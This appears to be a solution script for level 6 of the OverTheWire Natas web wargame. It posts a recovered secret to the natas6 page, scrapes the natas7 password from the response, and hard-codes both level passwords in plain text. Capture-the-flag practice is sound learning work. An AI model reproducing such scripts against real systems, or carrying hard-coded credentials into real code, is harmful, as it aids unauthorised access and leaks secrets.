#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = "http://%s.natas.labs.overthewire.org" % username
session = requests.Session()

# response = requests.get(url, auth=(username,password))
response = session.post(url, data={'secret': 'FOEIUWGHFEEUHOFUOIU', 'submit': 'submit'}, auth=(username,password))

content = response.text

# print(content)
print(re.findall("Access granted. The password for natas7 is (.*)", content)[0])

# 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9